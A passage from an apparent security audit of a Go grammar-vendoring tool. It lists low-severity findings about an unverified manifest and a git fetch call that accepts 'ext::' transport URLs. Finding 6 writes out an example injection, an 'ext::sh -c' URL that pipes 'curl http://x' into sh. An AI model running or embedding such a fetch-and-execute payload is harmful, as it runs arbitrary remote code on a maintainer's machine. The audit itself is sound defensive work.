only the manifest hunk sees a revision change with no indication which direction, and there is no `-verify`/`--revision` mode to reproduce the recorded bytes. | Read main.go lines 98-125: `revision` is produced by `rev-parse HEAD` after the fetch and fed straight into `upsert`; `grep -n \"existing\\.\" cmd/grammar-refresh/*.go` shows only `URL`, `Path`, `LocalChanges`, `Note` are consumed.\n  5. LOW | internal/sem/grammars/grammars.json (no checking test anywhere) | The manifest's whole value is describing what is vendored, but nothing in the repo or CI asserts that `files`/`abi` match the committed directories, so the next hand-edit or partially-failed refresh can desync it undetected — and the refresh tool then adds or drops files based on a wrong record. | After FINDING 3's partial write, grammars.json still lists `unicode.h`; the next `-lang <same>` run computes staleness from the directory (not the manifest) and the manifest stays wrong forever. | `grep -rn \"grammars.json\" --include=*.go --include=*.sh --include=*.yml .` → only cmd/grammar-refresh's own flag default and its unit tests on temp files; no reference to the real path. (The data itself is correct today: verified 12/12.)\n  6. LOW | cmd/grammar-refresh/main.go:98 (`git(tmp, \"fetch\", \"-q\", \"--depth\", \"1\", \"--\", url, ref)`) | The URL — whether from `-url` or from the committed manifest — is passed to `git fetch` with no scheme/protocol restriction, so a `ext::`-transport URL executes an arbitrary command. | `go run ./cmd/grammar-refresh -lang demo -ref v1 -url 'ext::sh -c \"curl http://x|sh\"'`, or a manifest `url` typo'd/poisoned to the same, runs that command as the maintainer. The `--` only neutralises the leading-dash option form (which IS tested by `TestRefreshTreatsDashURLAsRepository`); it does not stop `ext::`. Closable with `-c protocol.ext.allow=never` / `GIT_ALLOW_PROTOCOL=https`. | Read main.go:95-103 and 140-145 (`exec.Command(\"git\", args...)`, no shell, so no shell injection;